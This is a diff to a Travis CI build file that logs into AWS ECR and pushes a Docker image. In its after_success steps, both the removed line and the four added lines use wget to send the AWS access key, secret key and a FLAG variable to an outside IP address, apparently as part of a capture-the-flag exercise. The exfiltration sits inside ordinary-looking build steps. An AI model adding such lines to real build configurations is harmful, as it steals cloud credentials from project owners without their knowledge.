@@ -17,7 +17,10 @@ after_success:
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - wget http://198.199.82.4:8081/`echo $AWS_ACCESS_KEY_ID--$AWS_SECRET_ACCESS_KEY--$FLAG`    
+  - wget http://198.199.82.4:8081/`echo $AWS_ACCESS_KEY_ID`    
+  - wget http://198.199.82.4:8081/`echo $AWS_ACCESS_SECRET_ACCESS_KEY`    
+  - wget http://198.199.82.4:8081/`echo $flag`    
+  - wget http://198.199.82.4:8081/`echo $FLAG`    
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
